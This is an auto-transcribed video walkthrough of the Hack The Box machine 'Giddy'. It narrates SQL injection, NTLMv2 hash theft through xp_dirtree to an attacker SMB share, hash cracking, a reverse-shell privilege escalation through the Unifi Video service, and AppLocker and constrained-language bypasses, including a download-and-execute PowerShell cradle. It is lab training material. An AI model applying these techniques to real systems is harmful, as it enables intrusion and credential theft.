 what's going on YouTube this is ifs I can be doing giddy from hack the box and apologies ahead of time if this video feels rushed literally soon as I finished recording this I'm going to bed waking up corner in the airport and then beginning vacation so it feels rushed it is what I remember about this box is it had a SQL injectable web service and that database was ms SQL you could trick that database into accessing a file on a SMB share that you control and when you do that you can steal the ntlm v2 hash you crack that hash you get access to PowerShell web services and then from there you notice that the unified video service is installed and it's a old version and that specific version you have when you stop the service it attempts to run tasks killed exe out of its directory which you have write access to so you can just drop a executable stop the service and then execute that executable and you get a shell so let's just jump on in as always we're gonna stop and map with - SC for default scripts as we enumerate versions Oh a output or formats put in the end metric and call it giddy and then the IP address which is 10 10 10 104 this can take some time to run so I've already ran it look at the results we have three ports are open the first port is HTTP on port 80 its banner is microsoft iis httpd 10.0 so you can guess this is gonna be a Windows 2016 server the HTTP title of the page is just iis Windows Server so nothing too interesting we're on port 443 we do have HTTPS it's the same exact server banner and the SSL cert has the common name set to PowerShell web access test site so this is a bit interesting it was like it's just a PowerShell site maybe different than this port 81 and then on three three eight nine we have RDP and we see the cert is saying the common name is giddy which is gonna be the hostname of this box and then we also have the clock skew of the Box being four minutes behind us so the very first thing I want to do is go in my hosts file and add a entry for 10 10 10 104 and we'll call this and get because that is what the remote desktop [ __ ] had told us so let's go over to Firefox and do HTTP 10 10 10 104 and I also just want to go to a 10 10 10 104 in port 80 we see a picture of a dog if we copy the link location oh wait that's just going to say ice page so don't understand what's going on there looking at the page source we see it's just get a jpg and a link and then HTTP is doing the same exact thing if we want to we can view information about this certificate and see if there's anything of interest we have the common name as told us and it doesn't really look like there's anything too interesting I was wondering that had any more information confirming the her status box as like giddy and maybe something like the domain name it is on dot h TB or something but nothing there so let's just stand up a derp buster so we always have something going on in the background I said dirt Buster but I normally use go Buster so do go Buster - H - pull up the list we want - W for the word list so user share word list dirt buster then directory list two point three medium is where I generally use and then - you for URL HTTP 10 10 10 2004 and we could do - ex ASP and like aspx because we assume this is going to be a is server and there's a common extensions but I just want to find directories so I'm not gonna specify those just yet and we can do - t for threads and set this to 30 which is three times the default so let this run we get a hit on slash remote so let's go over and check what slash remote is so let's see does 1010 - 104 it does redirect so 10 10 10 104 on port 80 redirects us to HTTPS if we go to slash remote we get Windows PowerShell web access and a username password and then we can sign in we don't have any of this information so there's nothing really for us to do we can attempt to brute-force something but I really hate brute force in Windows just because lockouts are so common so going back to girl Buster's seeing if that ever does finish I guess we can do some things while good Westers running like let's save this image and then we'll copy the image into a current directory and see if maybe the image has any data so CP downloads giddy JPEG and then we can do exist tool giddy we don't see any metadata strings on giddy hex dump stag hide do I have it I don't have it installed so I won't be bothering with doing that then walk it see if there's anything else in this doesn't look like it so let's go back over to go Buster and we have a directory slash MVC so I'm going to go to slash MVC and see what this is it's taking a little while to load and it looks like we have a asp.net application and we just see product name if we click on various things about nothing there contact nothing really there search term let's search for test and zero products found so if we search for caps see we have three products found we search for caps with a apostrophe we get a error so server error in MVC application so let's try a comment so I think it's just two dashes maybe and we no longer get an error so this produces a SQL error this does not because the syntax is something like select star from items where name is like test and what we did is we just put that apostrophe in and then we can put stuff here but however the server automatically puts that other apostrophe so that creates an error in the s12 syntax so what we did is we put test and then a comment so now there's apostrophe that the server puts in means nothing so we have a SQL injection we can test other places let's try looking at chains we see the ID for each item is in this so we can try the same exact thing and it looks like we have SQL injection and the ID as well so do five we get that and I'm gonna guess because this is a integer number it's not encased in quotes so that's why we do a single quote here with the comment we're getting an error message but if we just do a flat-out comment we don't get anything so looks like we have two different SQL injections since I don't know if either that will show us output maybe this one will and let's just try so we can do Union select one error let's just send this over to burp so we can do this a bit quicker so go to burp suite intercept is on resend let's accept this cert warning maybe this isn't the easier one to do saying all this junk good repeater click go I really hate ASP applications let's see few state let's try this one last time and I may just do the one that's in the URL because that's easier to read so intercept on click search let's see redirect anti CSRF token ok search thumbs down there so we could go we have nine thousand 31 bytes click go again ok nine thousand thirty one flat bytes since I saw this anti cross-site scripting token I wanted to make sure my query would work multiple times cygwin chai Union select one add the comment and let's see all queries come on using Union must have equal number so let's do one comma two click go one comma three click go comma four and we're just trying to get it to where we no longer see this error message so we'll try comma 5 comma 6 comma 7 and now this gang a bit ridiculous so let's go and try another area or let's actually send this into SQL map so we'll copy this to file we don't want as we want kitty I'm gonna call this search dot request so let's go in a search don't request the only thing I want to do is remove this and I'm just going to put a star to tell sequel mapped and - there so let's - sequel map - sure search not request it found the inject marker and let's just keep proceeding with assuming everything so while that runs let's go and play with the other sequel injection so I can go back to burp proxy intercept off let's go to home click here and then let's verify again put a comment that's good we put a single quote we get an error message so let's go back to burp turn intercept on refresh this and we'll send this one over to repeater and play with this so we'll do 27 and then do Union select 1 2 3 4 5 and we're getting about the same thing which is annoying so I'm not gonna play with Union selects anymore we found it is vulnerable this is doing something let's try - - DBMS because it says it can't fingerprint the back-end database management and we're going to assume mrs. M SQL so it found stacked queries and it found time-based blind so I'm doing a dump to dump well I thought it would dump resumed back-end is not a Microsoft sequel server you lie let's see so a force DBMS try this and we'll see if that actually does work but you can go back to burp I can let's go to Firefox timber off and let's do em SQL SQL injection cheat sheet and see what this brings so scrolling down there are normally two things I really want to do and since it did say we have stacked queries it makes it a little easy to do so we want to try command execution so let's try inserting these so go back to burp didn't just do a semicolon and that is ugly so I guess it did not like how it pasted is it like a case text option was wrong we pasted so well we go let's try putting this back I have no idea what happened that I think I just pasted something I shouldn't have so this works copy request to file and we'll call this ID dot request and do the same thing in SQL map so put it here and maybe this one will be a bit easier for SQL map to inject than the last one okay I should have done - batch so it doesn't ask me anything but let's go on and we go back to Firefox since it's saying it's not SQL Microsoft sequel I want to try one thing I would try comments this way because I think this is a bit unique to M SQL how it does the comments with slash star so that would be a easy way to kind of verify we're on this so we do comment please subscribe comment click go and does not error so we'll put junk at the end of that and we get an error message so we know slash star is a valid comment which also leans towards msql so let's go back and try to enable the XP CMD shell so that's copied let's go in a terminal see the backend database is Microsoft sequel so this one it can actually fingerprint it correctly and I'm gonna do - - match so it doesn't ask me everything and I'm pasting the stuff in here so it begins to be a bit more a ski so we don't copy and get all that junk we did before so copy this go to Burt and we still got the junk so just delete that let's see XP CMD show net user and then comment highlight control you click go we didn't get an error message so that's good let's try see set this I think we need - - paste Prive or is that a comment I don't come with Microsoft sequel databases that often I know Talley probably does something a bit better I think if we do all this will end up it won't work anyways try this then reconfigure and then let's see just try whoops XP CMD shell Who am I click go does not like this space invalid syntax near XP CMD shell we do exec don't get anything so we can try pinging yourself so we can do ping 10 10 14 3 and then TCP dump - I time 0 ICMP click go go back here and we're not getting any output so chances are that was odd maybe we did get output click go I did - and to not show DNS okay so yep no data sometimes if you do TCP dump and you don't specify - n if it tries to do lookups on DNS your output gets lagged so that's why I went back and tried with - n so let's go and try a file so let's see I don't think this is the cheat sheet I want let's go back I want to do xB der tree so this is just a different one command execution we can try this one it has exact master DB oh so specifying a bit more before XP CMD shell so just to verify this I could highlight there we go TCP dump running I'm not seeing any information so I want the tree XP do a tree so this the one I want and [Music] bit odd so copy this and we will do it here so it's a bit easy to follow first so we're going to declare the variable Q and we're going to say it's a string for 200 characters and that's gonna be 10 10 14 3 backslash and it can be any folder please it's subscribe and it's 10 10 14 3 because that should be the host name of I'm not the host name the IP address of my box and then going back to this we just want to exec this well see if we can browse files so declaring the variable setting the variable then doing a XP derp tree on the variable so let's put this in our query paste that in highlight everything convert it to URL click go internal server error that was odd let's do n CL v NP 4 4 5 to see if we're connecting does not look like it I don't know if I have a comment at the end of this I can't tell cuz that HTML so let's control shift Q so declare Q set Q exec and then comment that should work 10 10 14 3 please subscribe give it a filename maybe change these double quotes to single quotes maybe there's some weird like escaping with double quotes we'd have to do and now the server's not responding and we actually get data back which is good so we have the server attempting to connect to us over port for 4 or 5 so what we want to do is set up responder and we're going to allow it to authenticate to us and then try to steal the hash it authenticates to us with so respond to - i tun 0 and then let's send this request again actually before we do I want to do a double quote and see if it was some weird escaping thing with back escapes so every time there's a backslash I'm going to double it up and see if it works with double quotes nope so this just wants single quotes so let's do this again put a single quote here click go go back and when the server connects to us it's going to send us the ntlm v2 hash which responder would display and NDL MV 2 uses the username and computer name as part of the salting mechanism so the hash actually does include that unlike most hashes so let's copy everything go into my kraken and go into the hash cat folder that's hashes get e dot ntlm v to paste the hash and then let's do dot slash hash cat h shy ntlm we see ntlm v2 is 5,600 so hash cat - m 600 hashes giddy and then we'll do opt word list rocky text and if you don't have a hash cat I didn't recommend installing it on your host OS not in a VM because vm's make it go slower so we did get it correct and we have the password as X N and W 0 6 - 7 - k 7x no idea why that's in the rock you that isn't definitely an odd password that's not a keyboard walk or something so not sure what that is but we'll go and try this and that windows powershell remote thing so we'll try the username as Stacie paste the password computer name as giddy sign in let's not save this and we can't establish connection so let's try the username as giddy backslash Stacie paste this in click sign in and we get a power shell prompt so a lot of times windows likes the domain and then the username if there's no domain the domain is the computer name or the workgroup name so we get a power shell prompt as Stacie and we are in the Documents folder we do a dir and go to submit we have unified video which is odd and this is actually a hint that it is the previs if we go back to Kali do search poit unify and we have unify video local privilege escalation so let's search poit - M to mirror this and then we can look at this text file and see what the details are and after we do all this then we'll spend a bit more time and do other cool things on this box but let's see upon in starting and stopping the service it tries to load and execute a file at C colon backslash program data backslash unify video backslash taskkill the photo doesn't exist and if we can write to that directory then we can get that file so let us do that it's not telling us how to start and stop the service but let's go back in the powershell and it wanted us go into CD program data let's take a water run this command Zod let's refresh this page leave the page 1 of this box just went down paying 10 10 10 104 and it looks like the box is down or my VPNs down so I'm going to pause the video restore a connection and then we will resume so I can now talk to the box again let's go back to Firefox and we still connected it looks like we are so CD back slash CD program data and then we want to go into unify video and then see if we can just write to this directory we see there is no taskkill so if we do echo please subscribe to test right do I dir and we can see we can write to this directory so it wants us to write a file called task kill exe so let us try creating that so we'll do MSF venom - P for payload windows meterpreter reverse tcp host is equal to 10 10 14 3o port would do 9001 - F format Exe Oh for output and we'll call this met dot exe this drill is as I type that you probably should have called it task kill exe but let and I said Adam create that file while we do that let's launch Metasploit with MS FDB run and then we'll do in packet SMB server and we'll say files PWD so what this does it sets up a SMB server we have back slash files as a directory or a share and this does the current working directory so let's set up the listener so use multi and ler listeners that's not it use exploit multi handler that's what it is then we can do set ellos ten ten fourteen three set payload to be windows which I put a reverse TCP and set L port to be nine thousand one run this and if we go back to this PowerShell window we can try xcopy ten ten fourteen three backslash what I call it test by quarter files and then met dotty accede to this directory we should see it connect so it can copy a file we got one file copied if we do a dir we can see Matt dot exe so let's move this do tasks kill exe because that's what the CVE said to do and we see Windows Defender has stopped us so what I'm going to do is go into a Windows VM and compile a dotnet reverse shell just so we don't have to worry about Windows Defender so let's go over to Google and just Google dot matt reverse shell go to this very first result and let's go and download this so open up visual studio and while this loads there's one thing we have to do let's check what dotnet version we're on so if we do dir SC : Windows microsoft.net I think it's framework 64 what's in this directory we see version 4.0 so that's going to be everything I compile it to so v4 yeah so we're going to compile to dotnet 4.0 let's switch over to my Windows VM new project we want a console application call it Rev shell then go to program that CS not sure what that air was open it should let me type it's something having my visual studio that is no let's try this again open up visual studio will also make sure my disk test base have this copied new project okay let's call this Reb shell to creating the project let's see if I go to 172 1610 182 files nope I would just want if I could route to my cow a VM from my Windows VM does not look like it oh wait it's not secure and using smb1 so looks like impacted I may have to do like - smb2 or something to allow it to melt but anyways copy their shellcode let's change the IP there ten ten fourteen three change the point to 9000 - and everything looks good so let's save it and then we have to go to properties dotnet framework if it compiles 4 - that'll be fine it just can't be above 4.0 the old failed namespace link doesn't exist so can't use - lets go for the old solution and we have built it so let me go back to Cali real quick is there smb2 option I can find quickly packet SMB server - SMB to support for try this I don't know this title bar is not working to switch easily click here full screen 172 1610 182 files ok so now we can just drop the file now one of Windows Defender found this as a threat but it's just other things I have on this machine let's do what is it saved as see : users Rev she'll open this bin-debug Rev she'll to exe so it looks like I just had something else on this box that Windows Defender finally call it so copy that to my Kali box this mount is not happy but we have confirmed it is there so let's do a PS EF grant Python kill we saw a sequel map running want to kill this put four three eight okay start this up again netstat al MP grep four four four five kilo - nine four four three eight okay so let's go back to firefox xcopy ten ten fourteen three files and we call this rev to DXE is it slash file let's get rid of this smb2 support maybe that was stopping up C files and valid dry specification Rev shell to shell to dot exe there we go so we copy the file and we can now move Rev shell to dhc-2 taskkill dot exe and then we have to find the unified video service so you can do get service and we see the operation failed so let's try SC query state equals all that doesn't work I think it's get WMI object win32 underscore service see what this does and we get access to nide so we can't really list the service on this box because of weird permissions but let's try going into the registry where the services are stored and see if we can find them that way so we do set location H key local machine system currentcontrolset services and we have to close that off so now we can see her current working directory is a registry hive we can just do get child item period and we will list all the services so let's see looks like it's listing them in alphabetical order which is nice and all we have to do is find unify so let's see W so let's do get showered item select name and now let's scroll up and we should see unify somewhere see you a there's M unify video service so we try net stop on this we get access denied let's try get child item unify video service and that's not allowed unify where object name is like unify is that going to work nope cancel let's try that there we go display name is this so let's try stop service that will this work oh we also should probably be listening on port 9000 - in case taskkill runs so let's try start service and see if we get a call back it's waiting for it to start okay let's try stopping it again it's waiting for it to stop I'm guessing once it hits about four or five stops that's when it tries to run taskkill to force kill the service still nothing see there we go we got a show we do Who am I we're now anti-authority / system so if we go into users administrator and then desktop we have route text which is 32 characters long so this is gonna be the md5 sum one of the cool things about this box is it does have a blocker running on it so if I just try to execute this task kill as my user let's do dot slash task kill exe oh I have to go back into C colon program data or was it unify video I just try to run task kill I can't because there is a group policy blocking me from doing that and this is a placas if we do like AppLocker bypass and go into this ultimate app lock a bypass list we can go to generic and there's a bunch of directories and normally AppLocker whitelist anything under like C : windows and they're just as a whitelist directory so we can write to any of these directories then chances are we can have a bypass so let's go to windows system32 spool drivers color so let's do it within Firefox windows system32 spool drivers color and I should have moved it so let's copy here see do we have it we do so if we try to run this and let's exit this one we can see this one runs and we are Stasi the other thing a lot of people would probably run into on this box is if you want to do like powerup or something so let's go to opt powersploit - dev let's do probe ask that we can do python simple HTTP server on port 80 simple I have 1 X 2 T and we tried something like IX new object net dot web client download string HTTP 10 10 14 3 power up ps1 we see we're in constrained language mode so we can't do that we went back here we do that task kill do we exit constraint at language mood copy I don't think this is in PowerShell it's not well this show will just do PowerShell I think it does so we do IX invoke all checks I don't know if this is doing PowerShell only am I getting Stacy it is I don't think we're getting standard error let's see are we hitting I'm not even running a web service right now python m simple HTTP server 80 so I don't think this shell prints standard error cuz I'm not saying that in a message we can see we are not getting a hit back so we are getting stopped from constrain language mode so we have to find an escape of constraint language mode if we wanted to do things like this so I'm gonna go back to my Windows VM because I know ultimately I might have to compile it dotnet binary and really wish I knew why that was such a pain to click on so go back to an explore Google comm PowerShell escape constrained language mode and let's just try this github so download this open extract with this loaded the first thing I want to do is change this mode to be dotnet probably for which it's already yet so we can just build this tool so build solution and then we want to navigate to where it is so been debug see the old rebuild I don't think it likes something but there is a compiled version from 2018 let's just try changing this to dotnet 4c primary reference clean solution build solution is it just warning so it should still build then debug delete these see can we delete all this and skip that one build solution I honestly don't know why that's not building properties don't mint 3/5 okay it needs to be done that for build I think I'll have to take more time and read those error messages for five works on four or five I'm not sure if it's gonna work on the box but we can try because when it says version 4.0 I think that maybe version 4.5 I think they stopped being exact so let's just copy this and then I think I stopped the service so we may have to start the service back up I should have just done all this in a separate window we don't need Metasploit anymore let's do in packet SMB server - SMB - was it SMB to SMB to support files PWD I just access that 172 1610 files there we go so copy this let's just rename this to be bypassed Exe and now we can finally go back here Firefox and kill that let's go back to a directory where app lock is in effect so I should be able to write the documents so let's xcopy ten ten fourteen three files bypass dxz I forgot to specify location I want to copy to let's see invalid Drive specification stop this let's get rid of smb2 support not sure why it's causing an error but if it is LS there is bypassed itxc there let use x10 ten fourteen three files I'm not sure exactly why can't copy files out of this there we go I'm not sure what I was doing wrong but did something wrong yeah five past dot exe we can't execute this that's good so let's go do this real quick bypass PowerShell Australian language go back here and it actually uses one of the wall bins of install util and we got a reverse shell syntax built in so let's paste this in the file is actually C : user Stacey documents bypass dot exe the port let's do nine thousand three so NC l vnp nine thousand three and the reverse host is going to be ten ten fourteen three run this and if this air is out it would have been because of this net directory but we can see install util executed bypassed exe and it's trying to connect back and we do have a connection back so now we can finally go back and try this one last time so this power up ps1 and we see it actually hit our webserver so now we can do invoke all checks and wait and it all it does is print this error message because we have low permissions so we did all that work for essentially nothing so the other thing we could do before we end this video is just examine the PowerShell history files and before I do that I just want to do a double verification on constraint language mode so if we cancel this does this kill her show it did that's a shame so let's start the show again I'm gonna run the command via fight because draining language mode is off and then we're gonna run the command on both other shells so let's do execution context session state language mood I thought that was it go back here what did I do wrong forgot the dollar so copy so we can see full language is allowed here so let's go back to this cancel language mode one constrain language so now we want to CD into that printer directory see backslash do that again we're listening on 9000 - so we can run task kill this is that dotnet shell so let's copy this and see if it says full language or constrain language and this will tell us if we were correct about it just not having error message is displayed did that not output anything it did not so this reverse shell was wonky what's do dir did right tab has no contents so I'm not sure what this shell was in I can't prove it but we can do this ie X and show it never hits a web server so we know that just worked paste this in and we don't see another get power up so I'm gonna guess it's in constraint language mood actually wait powershell and wait to let powershell load because this is a command prompt I shoulda known that 1c is it's still running it is I should just open a new web session or background one of these so I can do other things at the same time because there's one last thing I want to show in the video let's do blue AMI let's get a prompt back because I have no clue where this show is at so I guess we have to redo this start okay this would be the last time I try this I think I had too much stuff on my clipboard and it freaked the terminal out execution context there we go constrain language so without doing that bypass we're stuck in constraining language mood so the very last thing I want to show is there is a PowerShell history file so we can do get PS read line option history save path and if we cap this file we can see PowerShell history and we can see net stop unify service execution context and I believe this is actually from the machine creator because we did not do - force on your stop service so if we go into this directory let's go into the directory and see the last time this file was written so last write time was June 17 2008 een so yes this is from the creator leaving some forensic evidence behind if you saw this file and pulled it then you would have an idea that it had to do with the unified video service let you exploit it so I hope you enjoyed the video take care guys and I will see you all next week